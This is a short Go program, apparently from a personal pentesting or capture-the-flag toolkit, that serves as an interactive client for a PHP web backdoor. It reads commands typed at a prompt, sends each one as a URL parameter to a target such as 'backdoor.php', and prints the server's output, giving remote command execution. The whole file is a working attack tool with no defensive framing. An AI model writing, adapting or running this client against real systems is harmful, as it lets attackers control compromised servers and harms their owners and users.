// Name: shell_client.go
// Author: churroxd8
// Description: Connects to a remote PHP/Web backdoor and provides and interaction for RCE.

package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run shell_client.go <FULL_URL> <PARAMETER>")
		fmt.Println("\nExamples:")
		fmt.Println("	PHP Backdoor:	go run shell_client.go http://10.10.10.5/backdoor.php cmd")
		fmt.Println("	One-Liner:		go run shell_client.go http://target.com/shell.php c")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	paramName := os.Args[2]

	reader := bufio.NewScanner(os.Stdin)

	fmt.Println("[*] Web Shell Connected")
	fmt.Printf("[*] Target: %s\n", targetURL)
	fmt.Printf("[*] Parameter: '?%s=<command>'\n", paramName)
	fmt.Println("[*] Type 'exit' to quit")

	for {
		fmt.Print("Shell> ")

		if !reader.Scan() {
			break
		}
		cmd := reader.Text()

		if strings.TrimSpace(cmd) == "exit" {
			fmt.Println("Bye!")
			break
		}

		if strings.TrimSpace(cmd) == "" {
			continue
		}

		params := url.Values{}
		params.Add(paramName, cmd)

		fullURL := fmt.Sprintf("%s?%s", targetURL, params.Encode())

		resp, err := http.Get(fullURL)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			continue
		}

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Error reading response: %v\n", err)
		}

		fmt.Println(string(body))
		resp.Body.Close()
	}
}
